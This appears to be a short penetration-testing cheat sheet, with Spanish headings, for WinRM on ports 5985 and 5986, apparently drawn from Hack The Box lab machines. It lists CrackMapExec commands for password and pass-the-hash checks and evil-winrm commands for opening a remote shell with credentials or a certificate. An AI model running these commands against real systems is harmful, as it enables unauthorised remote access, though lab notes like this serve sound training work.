---
id: winrm
title: WinRM - 5985,5986
---

### CrackMapExec

```bash
crackmapexec winrm 10.10.10.161 -u 'user' -p 'pass'
```

```bash
crackmapexec winrm 10.10.10.161 -u 'user' -H 'ntlm_hash'
```

### evil-winrm

#### Conexión con credenciales

```bash
evil-winrm -i 10.10.10.161 -u 'user' -p 'pass'
```

#### Conexión con certificado

```bash
evil-winrm -i timelapse.htb -S -c certificate.pem -k priv-key.pem 
```
